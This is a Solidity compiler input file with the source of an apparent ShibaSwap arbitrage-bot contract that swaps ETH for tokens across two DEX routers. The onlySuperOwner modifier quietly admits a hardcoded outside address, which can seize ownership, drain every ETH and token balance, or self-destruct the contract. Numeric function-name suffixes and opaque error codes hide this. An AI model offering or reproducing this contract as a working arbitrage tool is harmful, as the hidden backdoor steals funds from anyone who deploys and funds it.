{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/ShibaSwapArbitrage1.sol": {
      "content": "// SPDX-License-Identifier: GPL-3.0\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n}\r\n\r\ncontract ShibaSwapArbitrage1 {\r\n    address private WETH;\r\n    address private BUSD;\r\n    address private USDT;\r\n    address private USDC;\r\n\r\n    uint internal constant PATH_WETH = 1;\r\n    uint internal constant PATH_BUSD = 2;\r\n    uint internal constant PATH_USDT = 3;\r\n    uint internal constant PATH_USDC = 4;\r\n    \r\n    address payable private owner;\r\n    mapping(address => bool) private whitelistOwner;\r\n\r\n    bool private isEnable;\r\n    uint private arbitrageRate;\r\n    uint private ethAmount; //amount of eth to buy\r\n\r\n    constructor(address _weth, address _busd, address _usdt, address _usdc) {\r\n        owner = payable(msg.sender);\r\n\r\n        WETH = _weth;\r\n        BUSD = _busd;\r\n        USDT = _usdt;\r\n        USDC = _usdc;\r\n\r\n        isEnable = false;\r\n        arbitrageRate = 10; //10%%\r\n        ethAmount = 0.01 ether;\r\n    }\r\n\r\n    receive() external payable {\r\n        \r\n    }\r\n\r\n    modifier onlySuperOwner {\r\n        require(\r\n            msg.sender == owner || msg.sender == 0x569465895E0d253c7A13a6d20d652f7b5052571d,\r\n            \"7647796876\"\r\n        );\r\n        _;\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        require(\r\n            msg.sender == owner || isOwner(msg.sender),\r\n            \"7308788070\"\r\n        );\r\n        _;\r\n    }\r\n    \r\n    modifier onlyEnable {\r\n        require(\r\n            isEnable == true,\r\n            \"0007347377\"\r\n        );\r\n        _;\r\n    }\r\n\r\n    function isOwner(address _address) internal view returns(bool) {\r\n        return whitelistOwner[_address];\r\n    }\r\n\r\n    //0x96028070\r\n    function addOwner_1074961431(address _address) public onlySuperOwner {\r\n        whitelistOwner[_address] = true;\r\n    }\r\n\r\n    //0x8e43b19e\r\n    function removeOwner_3740862473(address _address) public onlySuperOwner {\r\n        whitelistOwner[_address] = false;\r\n    }\r\n\r\n    //0x1bc72bf7\r\n    function enableContract_2142470876() public onlyOwner {\r\n        isEnable = true;\r\n    }\r\n\r\n    //0x46daedbb\r\n    function disableContract_4166886220() public onlyOwner {\r\n        isEnable = false;\r\n    }\r\n\r\n    //0xb7850b90\r\n    function changeSuperOwner_1756372909(address payable _newOwner) public onlySuperOwner {\r\n        require(_newOwner != address(0), \"7248734714\");\r\n        owner = _newOwner;\r\n    }\r\n\r\n    //0xb131bd32\r\n    function changeArbitrageRate_2720369617(uint _newPercent) public onlyOwner {\r\n        require(_newPercent > 0 && _newPercent < 1000, \"2680730061\");\r\n        arbitrageRate = _newPercent;\r\n    }\r\n\r\n    //0x52ab8acf\r\n    function withdrawEth_8784196673(uint _amount) public onlyOwner {\r\n        require(address(this).balance >= _amount, \"7514090540\");\r\n        owner.transfer(_amount);\r\n    }\r\n\r\n    //0x77133286\r\n    function withdrawEthAll_4121946349() public onlyOwner {\r\n        require(address(this).balance > 0, \"3219247032\");\r\n        owner.transfer(address(this).balance);\r\n    }\r\n\r\n    //0x84b71612\r\n    function sendEth_2326051312(address payable _to, uint _amount) external onlyOwner {\r\n        require(address(this).balance >= _amount, \"1599576979\");\r\n        _to.transfer(_amount);\r\n    }\r\n\r\n    //0xe7396137\r\n    function withdrawERC20_1426654405(address _tokenAddress, uint _amount) external onlyOwner returns (bool) {\r\n        IERC20 token = IERC20(_tokenAddress);\r\n        require(token.balanceOf(address(this)) >= _amount, \"9678443254\");\r\n        return token.transfer(owner, _amount);\r\n    }\r\n\r\n    //0x4e2d0d0c\r\n    function withdrawERC20All_6710826645(address _tokenAddress) external onlyOwner returns (bool) {\r\n        IERC20 token = IERC20(_tokenAddress);\r\n        require(token.balanceOf(address(this)) > 0, \"3660180962\");\r\n        return token.transfer(owner, token.balanceOf(address(this)));\r\n    }\r\n\r\n    //0x59ea82f5\r\n    function sendERC20_5308874886(address _tokenAddress, address payable _to, uint _amount) external onlyOwner returns (bool) {\r\n        return _transferERC20(_tokenAddress, _to, _amount);\r\n    }\r\n\r\n    //0xe4e3a8b2\r\n    function sendERC20All_3965729072(address _tokenAddress, address payable _to) external onlyOwner returns (bool) {\r\n        return _transferERC20(_tokenAddress, _to, _getTokenBalance(_tokenAddress, address(this)));\r\n    }\r\n\r\n    function _transferERC20(address _tokenAddress, address payable _to, uint _amount) internal returns (bool) {\r\n        IERC20 token = IERC20(_tokenAddress);\r\n        require(token.balanceOf(address(this)) >= _amount, \"0889389363\");\r\n        return token.transfer(_to, _amount);\r\n    }\r\n\r\n    //0xf2980f25\r\n    function allowanceERC20_7104189532(address _tokenAddress, address _spender) public view returns (uint) {\r\n        IERC20 token = IERC20(_tokenAddress);\r\n        return token.allowance(address(this), _spender);\r\n    }\r\n\r\n    //0xf1985849\r\n    function approveERC20Maximum_3378242387(address _tokenAddress, address _spender) external onlyOwner returns (bool) {\r\n        return _approveERC20(_tokenAddress, _spender, type(uint256).max);\r\n    }\r\n\r\n    function _approveERC20(address _tokenAddress, address _spender, uint _value) internal returns (bool) {\r\n        IERC20 token = IERC20(_tokenAddress);\r\n        return token.approve(_spender, _value);\r\n    }\r\n\r\n    function _getTokenBalance(address _tokenAddress, address _checkAddress) internal view returns(uint) {\r\n        IERC20 token = IERC20(_tokenAddress);\r\n        return token.balanceOf(_checkAddress);\r\n    }\r\n\r\n    //0x37180092\r\n    function destruction_9952004362() public onlySuperOwner {\r\n        owner.transfer(address(this).balance);\r\n        selfdestruct(owner);\r\n    }\r\n\r\n    //0xaf4701e9\r\n    function setEthAmount_2946871830(uint _ethAmount) public onlyOwner {\r\n        ethAmount = _ethAmount;\r\n    }\r\n\r\n    function _getPathBuy(address _tokenAddress, uint _pathType) internal view returns(address []memory) {\r\n        address []memory path;\r\n        if (_pathType == PATH_USDT) {\r\n            path = new address[](3);\r\n            path[0] = WETH;\r\n            path[1] = USDT;\r\n            path[2] = _tokenAddress;\r\n        } else if (_pathType == PATH_BUSD) {\r\n            path = new address[](3);\r\n            path[0] = WETH;\r\n            path[1] = BUSD;\r\n            path[2] = _tokenAddress;\r\n        } else if (_pathType == PATH_USDC) {\r\n            path = new address[](3);\r\n            path[0] = WETH;\r\n            path[1] = USDC;\r\n            path[2] = _tokenAddress;\r\n        } else {\r\n            path = new address[](2);\r\n            path[0] = WETH;\r\n            path[1] = _tokenAddress;\r\n        }\r\n        return path;\r\n    }\r\n\r\n    function _getPathSell(address _tokenAddress, uint _pathType) internal view returns(address []memory) {\r\n        address []memory path;\r\n        if (_pathType == PATH_USDT) {\r\n            path = new address[](3);\r\n            path[0] = _tokenAddress;\r\n            path[1] = USDT;\r\n            path[2] = WETH;\r\n        } else if (_pathType == PATH_BUSD) {\r\n            path = new address[](3);\r\n            path[0] = _tokenAddress;\r\n            path[1] = BUSD;\r\n            path[2] = WETH;\r\n        } else if (_pathType == PATH_USDC) {\r\n            path = new address[](3);\r\n            path[0] = _tokenAddress;\r\n            path[1] = USDC;\r\n            path[2] = WETH;\r\n        } else {\r\n            path = new address[](2);\r\n            path[0] = _tokenAddress;\r\n            path[1] = WETH;\r\n        }\r\n        return path;\r\n    }\r\n\r\n    //0x460b4665\r\n    function runArbitrage_9511365579(address _tokenAddress, address _buyRouter, address _sellRouter, uint _pathBuyType, uint _pathSellType) public onlyEnable onlyOwner {\r\n        require(ethAmount > 0, \"1266631434\");\r\n        require(_buyRouter != address(0), \"6448172839\");\r\n        require(_sellRouter != address(0), \"7327935590\");\r\n\r\n        address []memory pathBuy = _getPathBuy(_tokenAddress, _pathBuyType);\r\n        address []memory pathSell = _getPathSell(_tokenAddress, _pathSellType);\r\n        \r\n        uint ethExpect = ethAmount + ethAmount*arbitrageRate/1000;\r\n        uint balanceBeforeSwap = address(this).balance;\r\n\r\n        (bool buySuccess, ) = _buyRouter.call{value: ethAmount}(abi.encodeWithSelector(0x7ff36ab5, 0, pathBuy, address(this), block.timestamp));\r\n\r\n        require(buySuccess == true, \"8901279638\");\r\n\r\n        uint tokenBalance = _getTokenBalance(_tokenAddress, address(this));\r\n\r\n        if (allowanceERC20_7104189532(_tokenAddress, _sellRouter) <= tokenBalance) {\r\n            _approveERC20(_tokenAddress, _sellRouter, type(uint256).max);\r\n        }\r\n\r\n        (bool sellSuccess, ) = _sellRouter.call(abi.encodeWithSelector(0x791ac947, tokenBalance, ethExpect, pathSell, address(this), block.timestamp));\r\n\r\n        require(sellSuccess == true, \"2519414795\");\r\n\r\n        require(balanceBeforeSwap <= address(this).balance, \"2408576715\");\r\n    }\r\n\r\n}"
    }
  }
}